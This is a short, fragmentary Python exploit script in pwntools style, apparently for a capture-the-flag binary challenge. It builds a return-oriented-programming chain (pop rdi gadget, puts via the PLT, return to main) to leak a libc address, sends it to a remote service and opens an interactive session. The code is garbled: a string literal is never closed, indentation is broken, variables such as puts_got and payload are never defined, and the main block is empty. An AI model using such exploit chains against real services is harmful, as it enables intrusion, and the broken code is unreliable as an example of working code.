import base64

gdb_script = '''

def conn():

        if args.GDB:
            gdb.attach(r, gdbscript=gdb_script)
    else:
        r = remote(HOST, PORT)

    return r

    puts_plt = e.plt['puts']

    info(hex(puts_got))
    info(hex(main))

    payload += p64(pop_rdi_ret)

    payload += p64(puts_plt)
    payload += p64(main)

    payload += p64(0x0)

    r.sendlineafter('>', payload)

    r.interactive()


if __name__ == "__main__":
